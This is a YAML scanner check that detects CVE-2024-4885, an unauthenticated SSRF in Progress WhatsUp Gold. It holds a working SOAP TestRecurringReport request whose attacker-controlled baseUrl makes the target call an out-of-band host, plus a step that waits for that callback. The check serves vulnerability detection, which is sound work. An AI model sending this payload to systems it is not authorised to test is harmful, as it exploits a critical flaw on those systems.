tests/cve/CVE-2024-4885.yaml

uid: 3cc6d2eb-f708-4cc4-b5e0-8d2d437434b8
name: "Progress WhatsUp Gold Unauthenticated SSRF via SOAP RecurringReport"
description: "Detects CVE-2024-4885 via OOB callback triggered by SOAP TestRecurringReport with attacker-controlled baseUrl."
type: cve
cve: CVE-2024-4885
cvss: 9.8
severity: critical
confidence_base: 0.30
tags: [ssrf, rce, soap, oob, kev, whatsupgold]
services: [http, https]
author: noctis
version: "1.0.0"
references:
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-4885"
  - "https://community.progress.com/s/article/WhatsUp-Gold-Security-Bulletin-June-2024"
  - "https://summoning.team/blog/progress-whatsup-gold-rce-cve-2024-4885/"
  - "https://github.com/sinsinology/CVE-2024-4885"

steps:
  - id: oob-soap
    action: http_request
    method: POST
    path: /NmAPI/RecurringReport
    port: "{{port}}"
    tls_insecure: true
    timeout_secs: 15
    condition: "oob_enabled"
    headers:
      Content-Type: "text/xml; charset=utf-8"
      SOAPAction: "http://tempuri.org/IRecurringReportServices/TestRecurringReport"
    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:a="http://schemas.datacontract.org/2004/07/Ipswitch.NM.Shared">
        <soap:Body>
          <TestRecurringReport xmlns="http://tempuri.org/">
            <rr>
              <a:ID>1</a:ID>
              <a:Name>noctis_test</a:Name>
              <a:URL>{"baseUrl":"{{oob_url}}","userId":1}</a:URL>
            </rr>
          </TestRecurringReport>
        </soap:Body>
      </soap:Envelope>
    store_as: soap_resp

  - id: wait-callback
    action: wait_oob
    oob_timeout_secs: 20
    store_as: oob_result
    condition: "oob_enabled"
    on_success:
      finding:
        confidence_delta: 0.67
        qod: 97
        evidence: "WhatsUp Gold SSRF confirmed — OOB callback received after unauthenticated SOAP TestRecurringReport (CVE-2024-4885)"
      stop: true
